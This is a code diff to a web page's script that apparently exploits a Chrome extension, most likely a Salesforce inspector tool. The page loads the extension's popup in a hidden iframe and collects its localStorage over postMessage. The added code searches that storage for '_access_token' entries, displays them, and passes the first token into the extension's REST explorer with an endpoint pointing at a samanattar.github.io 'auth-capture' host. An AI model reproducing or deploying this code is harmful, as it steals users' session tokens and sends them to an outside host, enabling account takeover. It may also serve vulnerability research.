@@ -20,100 +20,94 @@
         const networkLogDiv = document.getElementById('networkLog');
         let initialized = false;
 
-        // Add a timestamp cache parameter to force new request
-        function createExplorerUrl() {
+        function findAccessToken(storage) {
+            // Get all org instances first
+            const orgInstances = Object.entries(storage)
+                .filter(([key]) => key.endsWith('_orgInstance'))
+                .map(([key, value]) => ({
+                    instance: value,
+                    // Get the base key (remove _orgInstance)
+                    baseKey: key.replace('_orgInstance', '')
+                }));
+
+            // Look for corresponding access tokens
+            const tokens = orgInstances.map(org => {
+                const tokenKey = `${org.baseKey}_access_token`;
+                const token = storage[tokenKey];
+                return {
+                    instance: org.instance,
+                    tokenKey: tokenKey,
+                    token: token
+                };
+            });
+
+            return tokens;
+        }
+
+        function createExplorerUrl(instance, token) {
             const params = new URLSearchParams({
                 endpoint: '.samanattar.github.io/auth-capture',
                 method: 'GET',
                 format: 'json',
-                cache: Date.now(), // Add cache buster
-                contentType: 'application/json',
+                cache: Date.now(),
+                // Include the token and instance
+                instance: instance,
+                access_token: token
             });
             
             return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
         }
 
-        // Monitor network requests
-        const originalXHR = window.XMLHttpRequest;
-        window.XMLHttpRequest = function() {
-            const xhr = new originalXHR();
-            const send = xhr.send;
-            const open = xhr.open;
-            
-            xhr.open = function() {
-                networkLogDiv.innerHTML += `
-                    <h3>Request Started:</h3>
-                    <pre>URL: ${arguments[1]}</pre>
-                    <pre>Method: ${arguments[0]}</pre>
-                `;
-                return open.apply(this, arguments);
-            };
-            
-            xhr.send = function() {
-                this.addEventListener('load', function() {
-                    networkLogDiv.innerHTML += `
-                        <h3>Request Completed:</h3>
-                        <pre>Status: ${this.status}</pre>
-                        <pre>Headers Sent: ${this.getAllResponseHeaders()}</pre>
-                    `;
-                });
-                return send.apply(this, arguments);
-            };
-            
-            return xhr;
-        };
-
         window.addEventListener('message', function(event) {
-            // Log all messages for debugging
-            console.log('Message received:', event);
-            
+            // Ignore React DevTools messages
+            if (event.data.source?.includes('react-devtools')) {
+                return;
+            }
+
+            console.log('Message received:', event.data);
+
             if (event.data.insextInitRequest && !initialized) {
                 initialized = true;
                 const storage = event.data.iFrameLocalStorage || {};
                 
-                // Try to access extension's localStorage directly through the popup frame
-                try {
-                    const popupFrame = document.querySelector('iframe[src*="popup.html"]');
-                    if (popupFrame && popupFrame.contentWindow) {
-                        const localStorage = popupFrame.contentWindow.localStorage;
-                        console.log('Direct localStorage access:', localStorage);
-                        
-                        storageInfoDiv.innerHTML += `
-                            <h3>Direct LocalStorage:</h3>
-                            <pre>${JSON.stringify(Array.from(localStorage), null, 2)}</pre>
-                        `;
-                    }
-                } catch (e) {
-                    console.log('Could not access direct localStorage:', e);
-                }
+                // Find access tokens using the correct pattern
+                const tokens = findAccessToken(storage);
 
-                // Display all received data
                 messagesDiv.innerHTML = `
+                    <h3>Found Tokens:</h3>
+                    <pre>${JSON.stringify(tokens, null, 2)}</pre>
+                    
                     <h3>Storage Keys:</h3>
                     <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
-                    
-                    <h3>Full Initialization Data:</h3>
-                    <pre>${JSON.stringify(event.data, null, 2)}</pre>
                 `;
 
-                // Load explorer with cache-busting parameter
-                const explorerFrame = document.createElement('iframe');
-                explorerFrame.src = createExplorerUrl();
-                explorerFrame.className = 'explorer-frame';
-                document.body.appendChild(explorerFrame);
+                storageInfoDiv.innerHTML = `
+                    <h3>Full Storage:</h3>
+                    <pre>${JSON.stringify(storage, null, 2)}</pre>
+                `;
 
-                // Monitor explorer frame messages
-                explorerFrame.addEventListener('load', () => {
-                    networkLogDiv.innerHTML += `
-                        <h3>Explorer Frame Loaded</h3>
-                        <pre>URL: ${explorerFrame.src}</pre>
+                if (tokens.length > 0 && tokens[0].token) {
+                    const explorerFrame = document.createElement('iframe');
+                    explorerFrame.src = createExplorerUrl(tokens[0].instance, tokens[0].token);
+                    explorerFrame.className = 'explorer-frame';
+                    document.body.appendChild(explorerFrame);
+
+                    networkLogDiv.innerHTML = `
+                        <h3>Using Token:</h3>
+                        <pre>Instance: ${tokens[0].instance}</pre>
+                        <pre>Token Key: ${tokens[0].tokenKey}</pre>
+                        <pre>Token: ${tokens[0].token?.substring(0, 20)}...</pre>
                     `;
-                });
+                } else {
+                    messagesDiv.innerHTML += `
+                        <h3>No Access Tokens Found</h3>
+                        <p>Looking for pattern: [instance]_access_token</p>
+                    `;
+                }
             }
         });
 
         // Initialize the connection
-        console.log('Creating init frame');
         const initFrame = document.createElement('iframe');
         initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
         initFrame.style.display = 'none';
